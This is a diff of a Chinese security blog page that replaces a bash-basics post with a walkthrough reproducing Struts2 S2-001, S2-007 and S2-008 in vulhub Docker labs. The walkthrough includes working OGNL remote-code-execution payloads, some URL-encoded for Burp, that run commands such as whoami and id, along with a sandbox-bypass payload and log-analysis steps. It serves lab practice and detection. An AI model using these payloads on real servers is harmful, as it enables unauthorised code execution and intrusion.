@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OSCP-命令行乐趣 | Falao&#39;s Blog</title>
+  <title>常见框架漏洞 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="OSCP-命令行乐趣 | Falao&#39;s Blog">
+  <meta name="description" content="常见框架漏洞 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -603,9 +603,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-OSCP-命令行乐趣" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-常见框架漏洞" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">OSCP-命令行乐趣</h1>
+        <h1 class="article-title">常见框架漏洞</h1>
     
     <div class="article-meta">
         
@@ -615,7 +615,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="计算机认证">计算机认证</a>
+            <a  data-rel="WEB渗透">WEB渗透</a>
             
         </span>
         
@@ -623,7 +623,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-02-16 22:11:50'>2021-02-16 21:03</time>
+            Created At : <time class="date" title='Updated At: 2021-02-24 11:48:35'>2021-02-24 09:48</time>
         
     </div>
     <div class="article-meta">
@@ -645,7 +645,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-Line-Fun"><span class="toc-text">Command Line Fun</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-The-Bash-Enviroment"><span class="toc-text">1. The Bash Enviroment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-TAB-Completion"><span class="toc-text">2. TAB Completion</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-BASH-History-Tricks"><span class="toc-text">3. BASH History Tricks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Piping-and-Redirection"><span class="toc-text">4. Piping and Redirection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-grep-sed-cut-awk"><span class="toc-text">5. grep&#x2F;sed&#x2F;cut&#x2F;awk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Editing-Files-From-The-Command-Line"><span class="toc-text">6. Editing Files From The Command Line</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-Comparing-Files"><span class="toc-text">7. Comparing Files</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-Managing-Processes"><span class="toc-text">8. Managing  Processes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-File-and-Command-Monitoring"><span class="toc-text">9. File and Command Monitoring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-Downloading-Files"><span class="toc-text">10. Downloading Files</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-Customizing-the-Bash-Enviroment"><span class="toc-text">11. Customizing the Bash Enviroment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-Alias-Unalias"><span class="toc-text">12. Alias&#x2F;Unalias</span></a></li></ol></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9AStruts2%E6%A1%86%E6%9E%B6"><span class="toc-text">一：Struts2框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-s2-001%E5%A4%8D%E7%8E%B0"><span class="toc-text">1:s2-001复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">步骤一：启动靶机环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9ABP%E6%8A%93%E5%8C%85%E7%AF%A1%E6%94%B9%E6%95%B0%E6%8D%AE"><span class="toc-text">步骤二：BP抓包篡改数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF"><span class="toc-text">步骤三：查看日志信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">步骤四：日志分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-S2-007%E5%A4%8D%E7%8E%B0"><span class="toc-text">2:S2-007复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83-1"><span class="toc-text">步骤一：启动靶机环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9ABP%E6%8A%93%E5%8C%85%E7%AF%A1%E6%94%B9%E6%95%B0%E6%8D%AE-1"><span class="toc-text">步骤二：BP抓包篡改数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">步骤三：日志分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-S2-008%E5%A4%8D%E7%8E%B0"><span class="toc-text">3:S2-008复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83-2"><span class="toc-text">步骤一：启动靶机环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="toc-text">步骤二：攻击测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-1"><span class="toc-text">步骤三：日志分析</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -661,213 +661,213 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Command-Line-Fun"><a href="#Command-Line-Fun" class="headerlink" title="Command Line Fun"></a>Command Line Fun</h1><h4 id="1-The-Bash-Enviroment"><a href="#1-The-Bash-Enviroment" class="headerlink" title="1. The Bash Enviroment"></a>1. The Bash Enviroment</h4><blockquote>
-<p>Bash是一个与sh兼容的Shell;他允许我们从终端窗口运行复杂的命令和执行不同任务。结合了Korn Shell(Ksh)和C shell(csh)的特性。</p>
+        <h1 id="一：Struts2框架"><a href="#一：Struts2框架" class="headerlink" title="一：Struts2框架"></a>一：Struts2框架</h1><blockquote>
+<p>Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。</p>
 </blockquote>
-<p><strong>这些变量是在终端会话期间运行的任何应用程序继承的各种设置的一种全局存储形式</strong></p>
-<ul>
-<li><p>$PATH最常被引用的环境变量之一是$PATH,它是一个冒号分隔的目录路径列表，每当没有完整路径的命令运行时候，Bash都会搜索这些路径</p>
-<pre><code class="shell">┌──(laosec㉿kali)-[~]
-└─$ echo $PATH                                                              1 ⨯
-/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-┌──(laosec㉿kali)-[~]
-└─$ echo $USER
-laosec                                                                         
-┌──(laosec㉿kali)-[~]
-└─$ echo $HOME
-/home/laosec            </code></pre>
-</li>
-<li><p>可以通过export命令定义环境变量</p>
-<pre><code class="shell">export b=10.11.1.220   #将b变量加入到环境变量中
-ping -c 2 $b           #$b变量值  $$是查看当前进程的PID</code></pre>
-</li>
-<li><p>通过命令<strong>env</strong>来查看环境变量</p>
-<pre><code class="shell">──(laosec㉿kali)-[~]
-└─$ env               
-GJS_DEBUG_TOPICS=JS ERROR;JS LOG
-SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
-SESSION_MANAGER=local/kali:@/tmp/.ICE-unix/1185,unix/kali:/tmp/.ICE-unix/1185
-GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/e1988a97_fc6b_4732_b3ee_6a6bd85ff307
-SSH_AGENT_PID=1154
-XDG_CURRENT_DESKTOP=GNOME
-LANG=zh_CN.UTF-8
-LANGUAGE=zh_CN:zh
-PWD=/home/laosec
-QT_IM_MODULE=ibus
-GPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1
-USER=laosec
-GJS_DEBUG_OUTPUT=stderr
-XDG_MENU_PREFIX=gnome-
-DESKTOP_SESSION=gnome
-HOME=/home/laosec
-DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
-GTK_MODULES=gail:atk-bridge
-XDG_DATA_DIRS=/usr/share/gnome:/usr/local/share/:/usr/share/
-WINDOWPATH=2
-XDG_SESSION_DESKTOP=gnome
-QT_ACCESSIBILITY=1
-GNOME_DESKTOP_SESSION_ID=this-is-deprecated
-VTE_VERSION=6201
-QT_AUTO_SCREEN_SCALE_FACTOR=0
-LOGNAME=laosec
-GNOME_TERMINAL_SERVICE=:1.73
-PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-XDG_RUNTIME_DIR=/run/user/1000
-XMODIFIERS=@im=ibus
-SHELL=/usr/bin/zsh
-XDG_SESSION_TYPE=x11
-POWERSHELL_TELEMETRY_OPTOUT=1
-_JAVA_OPTIONS=-Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
-USERNAME=laosec
-GDM_LANG=zh_CN.UTF-8
-QT_QPA_PLATFORMTHEME=qt5ct
-XAUTHORITY=/run/user/1000/gdm/Xauthority
-COLORTERM=truecolor
-XDG_SESSION_CLASS=user
-TERM=xterm-256color
-GDMSESSION=gnome
-DISPLAY=:1
-SHLVL=1
-OLDPWD=/home/laosec </code></pre>
-</li>
-</ul>
-<h4 id="2-TAB-Completion"><a href="#2-TAB-Completion" class="headerlink" title="2. TAB Completion"></a>2. TAB Completion</h4><blockquote>
-<p>制表符–&gt; TAB键–&gt;命令补齐</p>
+<h3 id="1-s2-001复现"><a href="#1-s2-001复现" class="headerlink" title="1:s2-001复现"></a>1:s2-001复现</h3><h5 id="步骤一：启动靶机环境"><a href="#步骤一：启动靶机环境" class="headerlink" title="步骤一：启动靶机环境"></a>步骤一：启动靶机环境</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
+└─# pwd   #进入靶机容器存放目录
+/home/laosec/vulhub/struts2/s2-001                                                                       
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
+└─# ls    #查看目录下内容
+1.jpeg              Dockerfile  README.zh-cn.md
+docker-compose.yml  README.md   S2-001.war
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
+└─# cat README.zh-cn.md    #查看中文说明文件           
+# S2-001 远程代码执行漏洞
+## 原理
+参考 [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)
+&gt; 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
+## 环境
+执行以下命令启动s2-001测试环境
+​```
+docker-compose build
+docker-compose up -d
+​```
+## POC &amp;&amp; EXP
+获取tomcat执行路径：
+​```
+%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
+​```
+获取Web路径：
+​```
+%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
+​```
+执行任意命令（命令加参数：`new java.lang.String[]{"cat","/etc/passwd"}`）：
+​```
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+​```   
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
+└─# docker-compose up -d   #启动容器</code></pre>
+<h5 id="步骤二：BP抓包篡改数据"><a href="#步骤二：BP抓包篡改数据" class="headerlink" title="步骤二：BP抓包篡改数据"></a>步骤二：BP抓包篡改数据</h5><blockquote>
+<p>在登录界面任意输入用户名和密码，提交数据并使用BP拦截转发到repeater模块,从password字段进行修改</p>
 </blockquote>
-<h4 id="3-BASH-History-Tricks"><a href="#3-BASH-History-Tricks" class="headerlink" title="3. BASH History Tricks"></a>3. BASH History Tricks</h4><pre><code class="shell">history #查看历史命令
-！1     #执行历史命令的第一条命令
-！！    #执行上一条命令</code></pre>
-<blockquote>
-<p>命令历史记录保存在用户的家目录.bash_history</p>
-<p>HISTSIZE:控制当前会话内存中存储的命令数</p>
-<p>HISFILESIZE:配置历史文件中保存的命令数</p>
-</blockquote>
-<h4 id="4-Piping-and-Redirection"><a href="#4-Piping-and-Redirection" class="headerlink" title="4. Piping and Redirection"></a>4. Piping and Redirection</h4><blockquote>
-<p>管道和重定向,管道即作为一个命令的输出作为另一个命令的输入</p>
-</blockquote>
-<p><strong>从命令行运行的每个程序都有三个数据流连接到它，作为与外部环境的通信信道</strong></p>
-<table>
-<thead>
-<tr>
-<th>标准文件</th>
-<th>文件作用</th>
-<th>文件描述符</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Stdin</td>
-<td>标准输入</td>
-<td>0</td>
-</tr>
-<tr>
-<td>Stdout</td>
-<td>标准输出</td>
-<td>1</td>
-</tr>
-<tr>
-<td>Stderr</td>
-<td>标准错误输出</td>
-<td>2</td>
-</tr>
-</tbody></table>
-<pre><code class="shell">&gt; 输出重定向
-&gt;&gt; 输出追加重定向
-&lt; 输入重定向
-| 管道符</code></pre>
-<ul>
-<li><p>wc命令计算字数</p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-c –byte或–chars</td>
-<td>只显示Byte数 UTF-8编码</td>
-</tr>
-<tr>
-<td>-l 或 –line</td>
-<td>只显示行数</td>
-</tr>
-<tr>
-<td>-w 或 –words</td>
-<td>只显示字数</td>
-</tr>
-<tr>
-<td>-m</td>
-<td>对文件中的字符计数 ASCII字符占用字节</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>Exerices</p>
+<pre><code class="java">%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D</code></pre>
+<p><img src="https://s3.ax1x.com/2021/02/24/yOVBP1.png"></p>
+<p><img src="https://s3.ax1x.com/2021/02/24/yOV5Gt.png"></p>
+<h5 id="步骤三：查看日志信息"><a href="#步骤三：查看日志信息" class="headerlink" title="步骤三：查看日志信息"></a>步骤三：查看日志信息</h5><blockquote>
 <ol>
-<li>使用Cat与sort命令对/etc/passwd进行排序</li>
-<li>练习输出重定向</li>
+<li>查看容器,命令:<strong>docker ps</strong> （首先查看开启的容器/容器的ID）</li>
+<li>进入容器,找到日志文件,命令：docker exec -it f523bb254057 /bin/bash （进入容器：docker exec -it 容器ID /bin/bash ）</li>
+<li>打开日志,进入容器后ls查看目录，找到logs文件也就是日志存放的文件，ls查看目录，找到日志记录的txt文件</li>
 </ol>
-</li>
-</ul>
-<h4 id="5-grep-sed-cut-awk"><a href="#5-grep-sed-cut-awk" class="headerlink" title="5. grep/sed/cut/awk"></a>5. grep/sed/cut/awk</h4><blockquote>
-<p>正则表达式（regex）用于描述搜索模式的特殊文本字符串</p>
 </blockquote>
-<ul>
-<li><p>grep:搜索文件中匹配的字符串</p>
-</li>
-<li><p>sed:利用脚本来处理文本文件</p>
-</li>
-<li><p>cut:查看显示行中指定部分 -d:指定字段分隔符  -f:要切割的字段号</p>
-<pre><code class="shell">┌──(laosec㉿kali)-[~]
-└─$ cut -d ":" -f 1 /etc/passwd
-root
-daemon
-bin
-sys
-sync</code></pre>
-</li>
-<li><p>awk:数据提取和报告工具 -F:字段分隔符  print:输出结果文本</p>
-<pre><code class="shell">┌──(laosec㉿kali)-[~]
-└─$ echo "hello::there::firend" | awk -F "::" '{print $1,$3}'
-hello firend</code></pre>
-</li>
-<li><p>uniq/sort</p>
-</li>
-</ul>
-<h4 id="6-Editing-Files-From-The-Command-Line"><a href="#6-Editing-Files-From-The-Command-Line" class="headerlink" title="6. Editing Files From The Command Line"></a>6. Editing Files From The Command Line</h4><ul>
-<li>图形界面：gedit/leafpad</li>
-<li>命令行界面：vi/vim/nano</li>
-</ul>
-<h4 id="7-Comparing-Files"><a href="#7-Comparing-Files" class="headerlink" title="7. Comparing Files"></a>7. Comparing Files</h4><ul>
-<li>comm</li>
-<li>diff</li>
-<li>vimdiff</li>
-</ul>
-<h4 id="8-Managing-Processes"><a href="#8-Managing-Processes" class="headerlink" title="8. Managing  Processes"></a>8. Managing  Processes</h4><pre><code class="shell">ping baidu.com &gt; 1.txt &amp; Ctrl + z
-bg # 显示后台运行程序
-fg #调入前台
-ps #查看进程
-kill -9 #杀死进程</code></pre>
-<h4 id="9-File-and-Command-Monitoring"><a href="#9-File-and-Command-Monitoring" class="headerlink" title="9. File and Command Monitoring"></a>9. File and Command Monitoring</h4><ul>
-<li>tail：监视正在写入的日志文件条目</li>
-<li>watch：定期运行指定的命令</li>
-</ul>
-<h4 id="10-Downloading-Files"><a href="#10-Downloading-Files" class="headerlink" title="10. Downloading Files"></a>10. Downloading Files</h4><ul>
-<li>wget</li>
-<li>curl</li>
-<li>axel</li>
-</ul>
-<h4 id="11-Customizing-the-Bash-Enviroment"><a href="#11-Customizing-the-Bash-Enviroment" class="headerlink" title="11. Customizing the Bash Enviroment"></a>11. Customizing the Bash Enviroment</h4><pre><code class="shell">export
-export HISTTIMEFORMAT='%F %T'  #添加时间显示
-history</code></pre>
-<h4 id="12-Alias-Unalias"><a href="#12-Alias-Unalias" class="headerlink" title="12. Alias/Unalias"></a>12. Alias/Unalias</h4><pre><code class="shell">alias lsa='ls -la'   #创建别名lsa
-lsa                  #应用别名
-alias mkdir='ping -c 1 localhost'   #创建别名mkdir
-mkdir                #应用别名
-unalias mkdir        #删除别名
-mkdir                #再次测试</code></pre>
-<ul>
-<li>未完待续…</li>
-</ul>
+<pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
+└─# docker ps #查看开启的容器      
+CONTAINER ID   IMAGE            COMMAND             CREATED             STATUS             PORTS                    NAMES
+dbacf2ad73f8   s2-001_struts2   "catalina.sh run"   About an hour ago   Up About an hour   0.0.0.0:8080-&gt;8080/tcp   s2-001_struts2_1          
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
+└─# docker exec -it dbacf2ad73f8 /bin/bash   #进入容器
+root@dbacf2ad73f8:/usr/local/tomcat# ls
+LICENSE  NOTICE  RELEASE-NOTES  RUNNING.txt  bin  conf  include  lib  logs  native-jni-lib  temp  webapps  work
+root@dbacf2ad73f8:/usr/local/tomcat# cd logs  #进入日志目录
+root@dbacf2ad73f8:/usr/local/tomcat/logs# ls
+catalina.2021-02-24.log  host-manager.2021-02-24.log  localhost.2021-02-24.log  localhost_access_log.2021-02-24.txt  manager.2021-02-24.log
+root@dbacf2ad73f8:/usr/local/tomcat/logs# cat localhost_access_log.2021-02-24.txt  #查看访问日志
+192.168.0.104 - - [24/Feb/2021:01:55:22 +0000] "GET / HTTP/1.1" 200 1085
+192.168.0.104 - - [24/Feb/2021:01:55:22 +0000] "GET /favicon.ico HTTP/1.1" 404 1081
+192.168.0.104 - - [24/Feb/2021:01:58:50 +0000] "GET / HTTP/1.1" 200 1085
+192.168.0.104 - - [24/Feb/2021:01:58:50 +0000] "GET /favicon.ico HTTP/1.1" 404 1081
+192.168.0.104 - - [24/Feb/2021:02:57:26 +0000] "POST /login.action;jsessionid=B057108D156CC0121C69D64768A8E60C HTTP/1.1" 200 50742
+192.168.0.104 - - [24/Feb/2021:03:04:58 +0000] "POST /login.action;jsessionid=B057108D156CC0121C69D64768A8E60C HTTP/1.1" 200 50742
+root@dbacf2ad73f8:/usr/local/tomcat/logs# exit  #退出容器</code></pre>
+<h5 id="步骤四：日志分析"><a href="#步骤四：日志分析" class="headerlink" title="步骤四：日志分析"></a>步骤四：日志分析</h5><blockquote>
+<p>根据日志显示字节长度,判断是否为恶意攻击等行为(正常请求不会超过一千)</p>
+</blockquote>
+<h3 id="2-S2-007复现"><a href="#2-S2-007复现" class="headerlink" title="2:S2-007复现"></a>2:S2-007复现</h3><h5 id="步骤一：启动靶机环境-1"><a href="#步骤一：启动靶机环境-1" class="headerlink" title="步骤一：启动靶机环境"></a>步骤一：启动靶机环境</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-001]
+└─# docker stop dbacf2ad73f8              
+dbacf2ad73f8                                                             
+┌──(root💀kali)-[/home/laosec/vulhub/struts2]
+└─# cd ../s2-007                                                       
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# ls                 
+1.jpeg              Dockerfile  README.zh-cn.md
+docker-compose.yml  README.md   S2-007.war
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# cat README.zh-cn.md
+# S2-007 远程代码执行漏洞
+影响版本: 2.0.0 - 2.2.3
+漏洞详情: http://struts.apache.org/docs/s2-007.html
+## 测试环境搭建
+​```
+docker-compose build
+docker-compose up -d
+​```
+## 原理
+参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
+当配置了验证规则 `&lt;ActionName&gt;-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：
+​```java
+(...)
+public class UserAction extends ActionSupport {
+        private Integer age;
+        private String name;
+        private String email;
+(...)
+​```
+然后配置有 UserAction-validation.xml：
+​```xml
+&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
+&lt;!DOCTYPE validators PUBLIC
+        "-//OpenSymphony Group//XWork Validator 1.0//EN"
+        "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"&gt;
+&lt;validators&gt;
+        &lt;field name="age"&gt;
+                &lt;field-validator type="int"&gt;
+                        &lt;param name="min"&gt;1&lt;/param&gt;
+                        &lt;param name="max"&gt;150&lt;/param&gt;
+                &lt;/field-validator&gt;
+        &lt;/field&gt;
+&lt;/validators&gt;
+​```
+当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。
+因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload（**弹计算器，无法在本项目环境下运行**）：
+​```
+' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '
+​```
+## Exploit
+@rickgray 在原文中只给了弹计算器的POC，我给出执行任意代码的EXP：
+​```
+' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
+​```
+将Exp传入可以利用的输入框（age），得到命令执行结果
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# docker-compose build                                                         
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# docker-compose up -d
+Building with native build. Learn about native build in Compose here: https://docs.docker.com/go/compose-native-build/
+Creating network "s2-007_default" with the default driver
+Creating s2-007_struts2_1 ... done</code></pre>
+<h5 id="步骤二：BP抓包篡改数据-1"><a href="#步骤二：BP抓包篡改数据-1" class="headerlink" title="步骤二：BP抓包篡改数据"></a>步骤二：BP抓包篡改数据</h5><blockquote>
+<p>在登录界面任意输入用户名和密码与年龄，提交数据并使用BP拦截转发到repeater模块,从age字段进行修改</p>
+</blockquote>
+<pre><code class="java">=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27</code></pre>
+<p><img src="https://s3.ax1x.com/2021/02/24/yOKsxI.png"></p>
+<h5 id="步骤三：日志分析"><a href="#步骤三：日志分析" class="headerlink" title="步骤三：日志分析"></a>步骤三：日志分析</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# docker ps           
+CONTAINER ID   IMAGE            COMMAND             CREATED         STATUS         PORTS                    NAMES
+64a403fa2148   s2-007_struts2   "catalina.sh run"   5 minutes ago   Up 5 minutes   0.0.0.0:8080-&gt;8080/tcp   s2-007_struts2_1                                                                 
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# docker exec -it 64a403fa2148 /bin/bash
+root@64a403fa2148:/usr/local/tomcat# ls
+LICENSE  RELEASE-NOTES  bin   include  logs            temp     work
+NOTICE   RUNNING.txt    conf  lib      native-jni-lib  webapps
+root@64a403fa2148:/usr/local/tomcat# cd logs
+root@64a403fa2148:/usr/local/tomcat/logs# ls
+catalina.2021-02-24.log      localhost_access_log.2021-02-24.txt
+host-manager.2021-02-24.log  manager.2021-02-24.log
+localhost.2021-02-24.log
+root@64a403fa2148:/usr/local/tomcat/logs# cat localhost_access_log.2021-02-24.txt 
+192.168.0.104 - - [24/Feb/2021:03:28:50 +0000] "GET / HTTP/1.1" 200 1093 
+192.168.0.104 - - [24/Feb/2021:03:28:50 +0000] "GET /favicon.ico HTTP/1.1" 404 1081
+192.168.0.104 - - [24/Feb/2021:03:30:23 +0000] "POST /user.action HTTP/1.1" 200 288
+192.168.0.104 - - [24/Feb/2021:03:30:51 +0000] "POST /user.action HTTP/1.1" 200 1275
+#通过字节判断是否存在恶意攻击 正常请求不超过1000
+root@64a403fa2148:/usr/local/tomcat/logs# </code></pre>
+<h3 id="3-S2-008复现"><a href="#3-S2-008复现" class="headerlink" title="3:S2-008复现"></a>3:S2-008复现</h3><h5 id="步骤一：启动靶机环境-2"><a href="#步骤一：启动靶机环境-2" class="headerlink" title="步骤一：启动靶机环境"></a>步骤一：启动靶机环境</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# docker stop 64a403fa2148       
+64a403fa2148                                                                         
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-007]
+└─# cd ../s2-008                                                                              
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
+└─# cat README.zh-cn.md
+# S2-008 远程代码执行漏洞
+影响版本: 2.1.0 - 2.3.1
+漏洞详情: http://struts.apache.org/docs/s2-008.html
+## 测试环境搭建
+​```
+docker-compose build
+docker-compose up -d
+​```
+## 原理
+参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
